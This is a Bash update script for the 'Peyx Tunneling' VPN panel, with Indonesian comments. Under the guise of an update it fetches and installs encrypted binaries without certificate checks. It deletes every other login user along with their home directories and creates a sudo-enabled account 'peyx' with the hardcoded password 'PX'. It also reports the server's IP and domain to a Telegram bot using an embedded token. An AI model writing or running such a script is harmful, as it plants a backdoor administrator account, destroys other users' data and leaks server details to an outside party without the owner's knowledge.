#!/bin/bash

# ==================== KONFIGURASI WARNA MODERN ====================
REDBLD="\033[0m\033[91;1m"
Green="\e[92;1m"
RED="\033[1;31m"
YELLOW="\033[33;1m"
BLUE="\033[36;1m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
NC='\e[0m'
CYAN="\033[96;1m"
WHITE="\033[97;1m"
GRAY="\033[1;30m"

neutral="${NC}"
orange="\e[38;5;130m"
purple="\e[38;5;141m"
bold_white="\e[1;37m"
pink="\e[38;5;205m"
reset="\e[0m"
green="\e[38;5;82m"
red="\e[38;5;196m"
blue="\e[38;5;39m"
yellow="\e[38;5;226m"
gray="\e[38;5;245m"

MODERN_CYAN="\033[38;2;0;255;255m"
MODERN_PURPLE="\033[38;2;156;0;255m"
MODERN_GREEN="\033[38;2;0;255;128m"
MODERN_RED="\033[38;2;255;50;50m"
MODERN_ORANGE="\033[38;2;255;128;0m"
MODERN_DIM="\033[2m"
MODERN_BOLD="\033[1m"
RESET_ALL="\033[0m"

CHECK_ICON="✓"
CROSS_ICON="✗"

# ==================== DEFINISI VARIABEL ====================
REPO="https://raw.githubusercontent.com/PeyxDev/scripttun/main/"
pwadm="PX"
Username="peyx"
Password="PX"

# ==================== FUNGSI PROSES ====================
run_task() {
    local message="$1"
    local command="$2"

    echo -e "${MODERN_CYAN}◐${RESET_ALL} ${MODERN_BOLD}${message}...${RESET_ALL}"

    bash -c "$command" 2>&1 | while IFS= read -r line; do
        echo -e "${MODERN_DIM}   ${line}${RESET_ALL}"
    done
    local status=${PIPESTATUS[0]}

    if [ $status -eq 0 ]; then
        echo -e "${MODERN_GREEN}${CHECK_ICON}${RESET_ALL} ${MODERN_BOLD}${message}${RESET_ALL} ${MODERN_GREEN}${CHECK_ICON}${RESET_ALL}"
        return 0
    else
        echo -e "${MODERN_RED}${CROSS_ICON}${RESET_ALL} ${MODERN_BOLD}${message}${RESET_ALL} ${MODERN_RED}${CROSS_ICON}${RESET_ALL}"
        return 1
    fi
}

print_section_header() {
    local title="$1"
    echo ""
    echo -e "${MODERN_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET_ALL}"
    echo -e "${MODERN_BOLD}${WHITE}  ${title}${RESET_ALL}"
    echo -e "${MODERN_PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET_ALL}"
}

print_success() {
    echo -e "${MODERN_GREEN}  ${CHECK_ICON}${RESET_ALL} ${MODERN_BOLD}$1${RESET_ALL}"
}

print_error() {
    echo -e "${MODERN_RED}  ${CROSS_ICON}${RESET_ALL} ${MODERN_BOLD}$1${RESET_ALL}"
}

print_info() {
    echo -e "${MODERN_CYAN}  •${RESET_ALL} $1"
}

print_warning() {
    echo -e "${MODERN_ORANGE}  ⚠${RESET_ALL} ${MODERN_BOLD}$1${RESET_ALL}"
}

# ==================== AMBIL TOKEN TELEGRAM VIA CURL ====================
ambil_token_telegram() {
    print_info "Mengambil konfigurasi Telegram..."
    
    # Ambil dari server via curl
    KEY=$(curl -s --max-time 5 https://pxstore.web.id/bot-token 2>/dev/null)
    CHATID=$(curl -s --max-time 5 https://pxstore.web.id/bot-id 2>/dev/null)
    
    # Fallback jika gagal
    if [[ -z "$KEY" ]] || [[ "$KEY" == *"404"* ]] || [[ -z "$CHATID" ]]; then
        print_warning "Gagal mengambil dari server, menggunakan fallback lokal"
        if [[ -f /etc/bot/.bot.db ]]; then
            KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" 2>/dev/null | cut -d ' ' -f 2)
            CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" 2>/dev/null | cut -d ' ' -f 3)
        fi
    fi
    
    # Fallback default jika semua gagal
    if [[ -z "$KEY" ]]; then
        KEY="8485191955:AAE3H7QmWVprrGwRpWYIvEZHYf6DArQtWV4"
        CHATID="7661292905"
        print_warning "Menggunakan token default"
    else
        print_success "Konfigurasi Telegram berhasil diambil"
    fi
}

# ==================== MULAI UPDATE ====================
clear
print_section_header "🔄 UPDATE SCRIPT PEYX TUNNELING"

# Install p7zip-full jika belum ada
if ! command -v 7z &> /dev/null; then
    run_task "Installing p7zip-full" "apt install p7zip-full -y"
fi

# Ambil token Telegram
ambil_token_telegram

# Download dan extract menu
if run_task "Downloading menu.zip" "wget -q --no-check-certificate ${REPO}menu/menu.zip"; then
    run_task "Extracting menu files" "7z x -p$pwadm menu.zip -y &> /dev/null"
else
    print_error "Gagal download menu.zip, cek koneksi atau repository"
    exit 1
fi

# Setup menu files
print_info "Setting up menu commands..."
{
mv menu/expsc /usr/local/sbin/expsc 2>/dev/null
wget -q -O /usr/bin/enc "${REPO}install/encrypt" 2>/dev/null
chmod +x /usr/bin/enc 2>/dev/null
# Bersihkan CRLF (Windows line ending) dari semua file menu sebelum dieksekusi
find menu/ -maxdepth 1 -type f -exec sed -i 's/\r$//' {} \; 2>/dev/null
chmod +x menu/* 2>/dev/null
enc menu/* &> /dev/null
mv menu/* /usr/local/sbin/ 2>/dev/null
rm -rf menu menu.zip 2>/dev/null
rm -rf /usr/local/sbin/*~ 2>/dev/null
rm -rf /usr/local/sbin/gz* 2>/dev/null
rm -rf /usr/local/sbin/*.bak 2>/dev/null
} &> /dev/null

# Bersihkan user tidak perlu
print_info "Cleaning up unnecessary users..."
allowed_users=("root" "$Username")
all_users=$(awk -F: '$3>=1000 && $7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd 2>/dev/null)
for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" > /dev/null 2>&1
    fi
done

# Setup user peyx
if id "$Username" &>/dev/null; then
    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
else
    echo -e "$Username $Password" > /etc/xray/.adm 2>/dev/null
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
    usermod -aG sudo "$Username" > /dev/null 2>&1
fi

# Ambil versi server
serverV=$(curl -sS ${REPO}versi 2>/dev/null)
echo $serverV > /opt/.ver 2>/dev/null

# Bersihkan file temporary
rm -f /root/*.sh* 2>/dev/null

# Kirim notifikasi Telegram
if [[ -n "$KEY" ]] && [[ -n "$CHATID" ]]; then
    domain=$(cat /etc/xray/domain 2>/dev/null)
    MYIP=$(curl -sS ipv4.icanhazip.com 2>/dev/null)
    username=$(curl -sS https://raw.githubusercontent.com/PeyxDev/esce/main/ipx 2>/dev/null | grep $MYIP | awk '{print $2}')
    valid=$(curl -sS https://raw.githubusercontent.com/PeyxDev/esce/main/ipx 2>/dev/null | grep $MYIP | awk '{print $3}')
    
    today=$(date +"%Y-%m-%d")
    d1=$(date -d "$valid" +%s 2>/dev/null)
    d2=$(date -d "$today" +%s)
    certifacate=$(((d1 - d2) / 86400))
    [[ -z "$certifacate" ]] && certifacate=0
    
    TEXT="<b>-------------------------------</b>
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
<b>-------------------------------</b>
<b>IP VPS  :</b> ${MYIP}
<b>DOMAIN  :</b> ${domain}
<b>USER    :</b> ${username}
<b>EXPIRE  :</b> $certifacate DAY
<b>-------------------------------</b>
<b>Owner : @PeyxDev</b>
"
    TIME="10"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null &
fi

# Tampilkan hasil
echo ""
print_section_header "✅ UPDATE COMPLETE"
print_info "Version: ${serverV:-unknown}"
print_info "File download and setup completed successfully!"
echo ""

exit 0